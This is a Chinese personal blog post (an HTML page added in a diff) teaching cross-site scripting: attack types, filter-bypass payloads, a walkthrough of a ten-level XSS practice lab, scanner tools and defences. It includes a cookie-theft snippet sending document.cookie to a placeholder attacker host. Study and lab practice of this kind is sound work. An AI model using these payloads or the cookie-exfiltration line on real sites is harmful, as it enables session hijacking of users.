@@ -1,0 +1,629 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="学无止境" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="学无止境" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="学无止境" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Top10" />
+
+
+<link rel="canonical" href="http://example.com/2023/04/12/Internet%20Security/XSS/">
+
+
+
+  <title>
+XSS - 网安 |
+BLANK = 学无止境 = 与众不同，就一定会痛苦</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">XSS
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-04-12 21:27:07">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-04-12T21:27:07+08:00">2023-04-12</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>1.5k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>5 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">BLANK</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://acg.xydwz.cn/api/api.php?433353"></li>
+          <li class="item" data-background-image="https://acg.xydwz.cn/api/api.php?719710"></li>
+          <li class="item" data-background-image="https://acg.xydwz.cn/api/api.php?121256"></li>
+          <li class="item" data-background-image="https://acg.xydwz.cn/api/api.php?824593"></li>
+          <li class="item" data-background-image="https://acg.xydwz.cn/api/api.php?23784"></li>
+          <li class="item" data-background-image="https://acg.xydwz.cn/api/api.php?232813"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E7%BD%91%E5%AE%89/" itemprop="item" rel="index" title="分类于 网安"><span itemprop="name">网安</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/12/Internet%20Security/XSS/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="Blank">
+    <meta itemprop="description" content="与众不同，就一定会痛苦, 繁星不怕被看作流萤">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="学无止境">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><a name="b"></a></p>
+<h2 id="XSS攻击的原理是什么？"><a href="#XSS攻击的原理是什么？" class="headerlink" title="XSS攻击的原理是什么？"></a>XSS攻击的原理是什么？</h2><p>​    简单来说就是把用户输入的数据当做前端代码执行。（一般通过js的形式运行）<br><a name="b"></a></p>
+<h3 id="XSS攻击有哪些类型？区别是什么？"><a href="#XSS攻击有哪些类型？区别是什么？" class="headerlink" title="XSS攻击有哪些类型？区别是什么？"></a>XSS攻击有哪些类型？区别是什么？</h3><p><br><strong>存储型</strong>:常出现在信息修改添加等地方，导致恶意代码被存储在数据库中，每当被攻击者访问到后就会触发执行；<br><strong>反射型</strong>：常出现在url中，一般需要攻击者提前构造好恶意链接，欺骗用户点击，触发攻击代码；<br><strong>DOM型</strong>：攻击代码在url中，然后输出在了浏览器的DOM节点中。<br><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDM4NjY2MDY=">DOM节点</span>（简单来讲就是文本节点如）<br><strong>简单比较会发现，存储和反射都经过服务器，而DOM是纯前端。</strong><br><a name="b"></a></p>
+<h2 id="常见的XSS攻击"><a href="#常见的XSS攻击" class="headerlink" title="常见的XSS攻击"></a>常见的XSS攻击</h2><p>(xss的攻击关键是闭合)<br>1）基本形式</p>
+<pre><code class="js">&lt;script&gt;alert(1)&lt;script&gt;   &lt;script&gt;alert`1`&lt;/script&gt;
+&lt;a href=&quot;javascript:alert(1)&quot;&gt; ###可以不加引号
+&lt;img src=x onerror=&quot;alert(1)&quot;&gt;
+&lt;input onclick=&quot;alert(1)&quot;&gt;  
+</code></pre>
+<ol start="2">
+<li>绕过防火墙</li>
+</ol>
+<pre><code class="js">大小写双写       scrIpT scrscriptipt
+注释 //  /**/   &lt;!--&gt;&lt;--&gt; &lt;!--&gt;&lt;--!&gt;
+特殊字符 ſ      有时候可以当成script  == script
+换行            onclick=
+                        alert(1)
+远程js加载      &lt;a href=&quot;http://[access_ip]/xx.js&quot;&gt; 有一个这个网站可以访问的ip(有时可以是本地127.0.0.1）
+</code></pre>
+<ol start="3">
+<li>nc 连接</li>
+</ol>
+<pre><code class="js">&lt;script&gt;var img=document.getElement(&quot;img&quot;);img.src=&quot;http://hack_ip/a?:4444&quot;+escape(document.cookie);&lt;/script&gt;
+</code></pre>
+<p><a name="WqnHs"></a></p>
+<h2 id="注：如果是input型一般不需要加-视情况而论"><a href="#注：如果是input型一般不需要加-视情况而论" class="headerlink" title="注：如果是input型一般不需要加 视情况而论"></a>注：如果是input型一般不需要加<script> </script>视情况而论</h2><blockquote>
+<p><span class="exturl" data-url="aHR0cDovL3Rlc3QuY3RmOC5jb20vbGV2ZWwxLnBocA==">以靶场来举例</span><br>href不需再加&lt;a href=””        直接输javascript:alert(8)<br>————–<br></p>
+<pre><code class="js">&gt; 1.level1.php?name=1---------    (简单)&lt;br /&gt;2.level2.  haha&quot;&gt;&lt;script&gt;alert(5)&lt;/script&gt;//----------------(闭合)&lt;br /&gt;3.(&lt;、&gt;、\)被转意了&lt;br /&gt;F1.haha&#39;onclick=&#39;alert(8)  补全     &#39;&gt;-----------需要按键触发&lt;br /&gt;F2.haha&#39;oninput=&#39;alert(8)           &#39;&gt;-----------需要输入触发&lt;br /&gt;F3.haha&#39;onmouseover=&#39;alert(8)
+
+&gt; 4.同3&lt;br /&gt;5.将&lt;script&gt;替换为&lt;scr_ipt&gt;        on变为o_n&lt;br /&gt;用a标签+伪协议  &lt;br /&gt;aa&quot;&gt;&lt;a href=&quot;javascript:alert(8)&quot;&lt;/a&gt;// ------------点击触发&lt;br /&gt;或aa&quot;&gt;&lt;a href=&quot;javascript:alert(8)&quot;)&quot;nice&lt;/a&gt;&quot;
+
+&gt; 6.将on----o_n  ,  href---hr_ef   ,script----scr_ipt&lt;br /&gt;直接大写绕过on---On,href----HrEf,script---ScRiPt&lt;br /&gt;如:aa&quot;&gt;&lt;a HrEf=&quot;javasCRipt:alert(8)&quot;&lt;/a&gt;//
+
+&gt; 7.标签script被屏蔽&lt;br /&gt;双写绕过scscriptript
+
+&gt; 8.a标签&lt;a href=&quot;nice try!&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;&lt;br /&gt;且href---hr_ef&lt;br /&gt;有大小写屏蔽&lt;br /&gt;注：有了href就不需加href了---aa&quot;&gt;&lt;a href=&quot;javascript:alert(9)&quot;是错的&lt;br /&gt;直接对p进行实体编码(Unicode编码)&lt;br /&gt;javascri&amp;#112;t:alert(8)
+
+&gt; 9.有一个链接合法检测  检测有无关键词http://&lt;br /&gt;对on href script屏蔽&lt;br /&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;br /&gt;&lt;a href=&quot;javasc&amp;#114;ipt:alert(8)//http://------用//将http://注释掉
+
+&gt; 10.&amp;t_link=1&amp;t_history=2&amp;t_sort=3       -----(隐藏问题)&lt;br /&gt;看代码找input&lt;br /&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;br /&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;&lt;br /&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;3&quot; type=&quot;hidden&quot;&gt;&lt;br /&gt;把type=&quot;hidden&quot;-----type=&quot;&quot;&lt;br /&gt;&amp;t_sort=3&quot; type=&quot;&quot;oninput=&#39;alert(8)&#39;//
+</code></pre>
+</blockquote>
+<p><a name="b"></a></p>
+<h2 id="XSS攻击如何防范？"><a href="#XSS攻击如何防范？" class="headerlink" title="XSS攻击如何防范？"></a>XSS攻击如何防范？</h2><ul>
+<li>对输入数据进行Html Encode 处理，白名单过滤，过滤JavaScript 事件的标签，开启http-only，装WAF等。</li>
+</ul>
+<h5 id="XSS利用工具"><a href="#XSS利用工具" class="headerlink" title="XSS利用工具"></a><strong>XSS利用工具</strong></h5><p><a name="b"></a></p>
+<h2 id="XSSstrike"><a href="#XSSstrike" class="headerlink" title="XSSstrike"></a>XSSstrike</h2><h2 id><a href="#" class="headerlink" title></a><img data-src="https://3.bp.blogspot.com/-O7iiAsYG62A/WrSfaXsBtgI/AAAAAAAAKpw/TXjnhCF-8MUkiqksHFpUnf5LqfyO25fbwCLcBGAs/s1600/XSStrike_6.png" alt=" "></h2><ul>
+<li><p>XSStrike 是一个跨站点脚本检测套件，配备了四个手写解析器、一个智能负载生成器、一个强大的模糊引擎和一个速度极快的爬虫。</p>
+</li>
+<li><p>XSStrike 不像所有其他工具那样注入有效载荷并检查它是否正常工作，而是使用多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效载荷</p>
+</li>
+<li><p>除此之外，XSStrike 还具有爬虫、模糊测试、参数发现、WAF 检测等功能。它还会扫描 DOM XSS 漏洞。</p>
+<h1 id="主要特点："><a href="#主要特点：" class="headerlink" title="主要特点："></a>主要特点：</h1><ul>
+<li>反射和 DOM XSS 扫描</li>
+</ul>
+<ul>
+<li><p>多线程爬取</p>
+</li>
+<li><p>上下文分析</p>
+</li>
+<li><p>可配置内核</p>
+</li>
+<li><p>WAF检测和规避</p>
+</li>
+<li><p>过时的 JS 库扫描</p>
+</li>
+<li><p>智能载荷发生器</p>
+</li>
+<li><p>手工制作的 HTML 和 JavaScript 解析器</p>
+</li>
+<li><p>强大的模糊引擎</p>
+</li>
+<li><p>盲 XSS 支持</p>
+</li>
+<li><p>高度研究的工作流程</p>
+</li>
+<li><p>完整的 HTTP 支持</p>
+</li>
+<li><p>来自文件的暴力破解有效载荷</p>
+</li>
+<li><p>由<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9QaG90b24=">Photon</span>、<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi96ZXRhbml6ZQ==">Zetanize</span>和<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9Bcmp1bg==">Arjun提供支持</span></p>
+</li>
+<li><p>载荷编码</p>
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZS93aWtpL1VzYWdl">用法</span></h4></li>
+</ul>
+</li>
+</ul>
+<p><a name="b"></a></p>
+<h2 id="XSSPayload"><a href="#XSSPayload" class="headerlink" title="XSSPayload"></a>XSSPayload</h2><p>摘自：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHNzLXBheWxvYWQtbGlzdA==">https://github.com/payloadbox/xss-payload-list</span></p>
+<h4 id="XSS-Vulnerability-Scanner-Tool’s"><a href="#XSS-Vulnerability-Scanner-Tool’s" class="headerlink" title="XSS Vulnerability Scanner Tool’s :"></a>XSS Vulnerability Scanner Tool’s :</h4><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9YU1N0cmlrZQ==">XSStrike</span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NoYXdhcmtoYW5ldGhpY2FsaGFja2VyL0JydXRlWFNT">BruteXSS Terminal</span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhamVzaG1hanVtZGFyL0JydXRlWFNT">BruteXSS GUI</span><img data-src="https://netamooz.net/wp-content/uploads/2016/11/215.Brutexss.3.jpg"></li>
+<li><span class="exturl" data-url="aHR0cDovL3hzcy1zY2FubmVyLmNvbS8=">XSS Scanner Online</span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly90b29scy5rYWxpLm9yZy93ZWItYXBwbGljYXRpb25zL3hzc2Vy">XSSer</span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rhbk1jSW5lcm5leS94c3NjcmFweQ==">xsscrapy</span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Y4YmxpbmsvQ2hyb21pdW0tYmFzZWQtWFNTLVRhaW50LVRyYWNraW5n">Cyclops</span></li>
+</ul>
+<h4 id="参考-："><a href="#参考-：" class="headerlink" title="参考 ："></a>参考 ：</h4><h6 id="跨站点脚本-XSS"><a href="#跨站点脚本-XSS" class="headerlink" title="跨站点脚本 (XSS)"></a>跨站点脚本 (XSS)</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9Dcm9zcy1zaXRlX1NjcmlwdGluZ18oWFNTKQ==">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</span></li>
+</ul>
+<h6 id="XSS（跨站点脚本）预防备忘单"><a href="#XSS（跨站点脚本）预防备忘单" class="headerlink" title="XSS（跨站点脚本）预防备忘单"></a>XSS（跨站点脚本）预防备忘单</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9YU1NfKENyb3NzX1NpdGVfU2NyaXB0aW5nKV9QcmV2ZW50aW9uX0NoZWF0X1NoZWV0">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</span></li>
+</ul>
+<h6 id="基于-DOM-的-XSS-预防备忘单"><a href="#基于-DOM-的-XSS-预防备忘单" class="headerlink" title="基于 DOM 的 XSS 预防备忘单"></a>基于 DOM 的 XSS 预防备忘单</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9ET01fYmFzZWRfWFNTX1ByZXZlbnRpb25fQ2hlYXRfU2hlZXQ=">https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</span></li>
+</ul>
+<h6 id="反射跨站点脚本测试-OTG-INPVAL-001"><a href="#反射跨站点脚本测试-OTG-INPVAL-001" class="headerlink" title="反射跨站点脚本测试 (OTG-INPVAL-001)"></a>反射跨站点脚本测试 (OTG-INPVAL-001)</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9SZWZsZWN0ZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1JTlBWQUwtMDAxKQ==">https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)</span></li>
+</ul>
+<h6 id="测试存储的跨站点脚本-OTG-INPVAL-002"><a href="#测试存储的跨站点脚本-OTG-INPVAL-002" class="headerlink" title="测试存储的跨站点脚本 (OTG-INPVAL-002)"></a>测试存储的跨站点脚本 (OTG-INPVAL-002)</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TdG9yZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1JTlBWQUwtMDAyKQ==">https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)</span></li>
+</ul>
+<h6 id="测试基于-DOM-的跨站点脚本-OTG-CLIENT-001"><a href="#测试基于-DOM-的跨站点脚本-OTG-CLIENT-001" class="headerlink" title="测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)"></a>测试基于 DOM 的跨站点脚本 (OTG-CLIENT-001)</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9ET00tYmFzZWRfQ3Jvc3Nfc2l0ZV9zY3JpcHRpbmdfKE9URy1DTElFTlQtMDAxKQ==">https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)</span></li>
+</ul>
+<h6 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a>基于 DOM 的 XSS</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9ET01fQmFzZWRfWFNT">https://www.owasp.org/index.php/DOM_Based_XSS</span></li>
+</ul>
+<h6 id="跨站点脚本-XSS-备忘单-维拉代码"><a href="#跨站点脚本-XSS-备忘单-维拉代码" class="headerlink" title="跨站点脚本 (XSS) 备忘单 | 维拉代码"></a>跨站点脚本 (XSS) 备忘单 | 维拉代码</h6><ul>
+<li>👉 <span class="exturl" data-url="aHR0cHM6Ly93d3cudmVyYWNvZGUuY29tL3NlY3VyaXR5L3hzcw==">https://www.veracode.com/security/xss</span></li>
+</ul>
+<h4 id="推荐书籍："><a href="#推荐书籍：" class="headerlink" title="推荐书籍："></a>推荐书籍：</h4><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ib29rcy5nb29nbGUuY29tLnRyL2Jvb2tzL2Fib3V0L1hTU19BdHRhY2tzLmh0bWw/aWQ9ZFBocURlMFdIWjhD">XSS 攻击：跨站脚本利用与防御</span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9sZWFucHViLmNvbS94c3M=">XSS 备忘单</span></li>
+</ul>
+<h3 id="克隆现有存储库（使用-HTTPS-克隆）"><a href="#克隆现有存储库（使用-HTTPS-克隆）" class="headerlink" title="克隆现有存储库（使用 HTTPS 克隆）"></a>克隆现有存储库（使用 HTTPS 克隆）</h3><pre><code>root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git
+</code></pre>
+<h3 id="克隆现有存储库（使用-SSH-克隆）"><a href="#克隆现有存储库（使用-SSH-克隆）" class="headerlink" title="克隆现有存储库（使用 SSH 克隆）"></a>克隆现有存储库（使用 SSH 克隆）</h3><pre><code>root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git
+</code></pre>
+<p>跨站漏洞的区别<br><a name="b"></a></p>
+<h3 id="1-2-4-XSS-CSRF和SSRF区别是什么？"><a href="#1-2-4-XSS-CSRF和SSRF区别是什么？" class="headerlink" title="1.2.4 XSS,CSRF和SSRF区别是什么？"></a>1.2.4 XSS,CSRF和SSRF区别是什么？</h3><p><br>  <strong>XSS</strong>：跨站脚本攻击；<br>&gt; <strong>CSRF</strong>：跨站请求伪造脚本攻击；<br><strong>SSRF</strong>：服务器请求伪造攻击。<br>区别：<br><strong>XSS</strong>：XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的 脚本语句被执行。<br><strong>CSRF</strong>：CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 利用用户的Cookie信息伪造用户请求发送至服务器。<br><strong>SSRF</strong>：SSRF是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>
+
+      <div class="tags">
+          <a href="/tags/Top10/" rel="tag"><i class="ic i-tag"></i> Top10</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-04-12 21:28:45" itemprop="dateModified" datetime="2023-04-12T21:28:45+08:00">2023-04-12</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="Blank 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="Blank 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="Blank 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>Blank <i class="ic i-at"><em>@</em></i>学无止境
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2023/04/12/Internet%20Security/XSS/" title="XSS">http://example.com/2023/04/12/Internet Security/XSS/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/04/11/Internet%20Security/OSINT/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;i.ibb.co&#x2F;HGyd2qY&#x2F;f1.jpg" title="OSINT">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 网安</span>
+  <h3>OSINT</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">XSS攻击的原理是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B1%BB%E5%9E%8B%EF%BC%9F%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.1.</span> <span class="toc-text">XSS攻击有哪些类型？区别是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">常见的XSS攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%EF%BC%9A%E5%A6%82%E6%9E%9C%E6%98%AFinput%E5%9E%8B%E4%B8%80%E8%88%AC%E4%B8%8D%E9%9C%80%E8%A6%81%E5%8A%A0-%E8%A7%86%E6%83%85%E5%86%B5%E8%80%8C%E8%AE%BA"><span class="toc-number">1.3.</span> <span class="toc-text">注：如果是input型一般不需要加 视情况而论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83%EF%BC%9F"><span class="toc-number">1.4.</span> <span class="toc-text">XSS攻击如何防范？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.4.0.0.1.</span> <span class="toc-text">XSS利用工具</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSSstrike"><span class="toc-number">1.5.</span> <span class="toc-text">XSSstrike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.6.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">主要特点：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">用法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSSPayload"><span class="toc-number">2.1.</span> <span class="toc-text">XSSPayload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-Vulnerability-Scanner-Tool%E2%80%99s"><span class="toc-number">2.1.0.1.</span> <span class="toc-text">XSS Vulnerability Scanner Tool’s :</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83-%EF%BC%9A"><span class="toc-number">2.1.0.2.</span> <span class="toc-text">参考 ：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC-XSS"><span class="toc-number">2.1.0.2.0.1.</span> <span class="toc-text">跨站点脚本 (XSS)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%EF%BC%89%E9%A2%84%E9%98%B2%E5%A4%87%E5%BF%98%E5%8D%95"><span class="toc-number">2.1.0.2.0.2.</span> <span class="toc-text">XSS（跨站点脚本）预防备忘单</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E-DOM-%E7%9A%84-XSS-%E9%A2%84%E9%98%B2%E5%A4%87%E5%BF%98%E5%8D%95"><span class="toc-number">2.1.0.2.0.3.</span> <span class="toc-text">基于 DOM 的 XSS 预防备忘单</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E8%B7%A8%E7%AB%99%E7%82%B9%E8%84%9A%E6%9C%AC%E6%B5%8B%E8%AF%95-OTG-INPVAL-001"><span class="toc-number">2.1.0.2.0.4.</span> <span class="toc-text">反射跨站点脚本测试 (OTG-INPVAL-001)</span></a></li><li class="toc-item toc-level-6"><a 